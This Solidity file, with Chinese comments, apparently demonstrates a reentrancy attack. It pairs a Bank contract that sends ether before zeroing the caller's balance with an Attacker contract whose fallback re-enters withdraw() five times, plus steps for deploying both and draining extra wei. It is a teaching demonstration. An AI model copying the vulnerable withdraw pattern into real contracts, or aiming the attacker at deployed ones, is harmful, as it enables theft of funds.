//pragma solidity >=0.4.22 <0.6.0;
//先用一个账户部署Bank合约，然后再value存入50 wei
//调用另一个账户，复制刚刚部署的Bank合约的地址到deploy处，部署attacker合约，在value处输入10 wei，点击部署后的attack
//完成后，在点击查看wallet查看资金，显示为60 比正常充值10 wei 还多了5倍
pragma solidity ^0.4.25;

contract Bank{
    
    mapping(address => uint256) public balances;
    function wallet() constant returns(uint256 result){
        
        return this.balance;
    }
    
    function recharge() payable {
        
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(){
        
        require(msg.sender.call.value(balances[msg.sender])());
        balances[msg.sender] = 0;
    }
}


contract Attacker{
    
    address public bankAddr;
    uint attackCount = 0;
    constructor(address _bank){
        
        bankAddr = _bank;
    }
    
    function attack() payable{
        
        attackCount = 0;
        Bank bank = Bank(bankAddr);
        bank.recharge.value(msg.value)();
        bank.withdraw();
    }
    
    function () payable{
        
        if(msg.sender == bankAddr && attackCount<5 ){
            attackCount += 1;
            Bank bank = Bank(bankAddr);
            bank.withdraw();
            
        }
    }
    
    function wallet() constant returns(uint256 result){
        return this.balance;
    }
}
